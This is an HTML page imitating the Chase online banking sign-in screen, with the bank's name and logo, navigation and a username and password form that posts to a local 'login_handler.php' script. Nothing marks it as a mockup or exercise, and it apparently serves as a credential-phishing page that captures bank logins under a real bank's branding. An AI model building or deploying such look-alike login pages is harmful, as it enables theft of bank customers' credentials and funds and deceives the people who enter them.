<!DOCTYPE html>
<html>
<head>
    <title>Chase Online Banking</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="chase-logo.png" alt="Chase">
        </div>
        <nav>
            <a href="#">Personal</a>
            <a href="#">Business</a>
            <a href="#">Commercial</a>
        </nav>
    </div>
    
    <div class="main-content">
        <div class="login-section">
            <h2>Sign in to chase.com</h2>
            
            <form action="login_handler.php" method="POST" id="loginForm">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" class="signin-button">Sign In</button>
                
                <div class="remember-me">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Remember my username</label>
                </div>
            </form>
        </div>
        
        <div class="security-notice">
            <h3>Security Notice</h3>
            <p>For your protection, we may ask you to verify your identity.</p>
        </div>
    </div>

    <script src="validation.js"></script>
</body>
</html>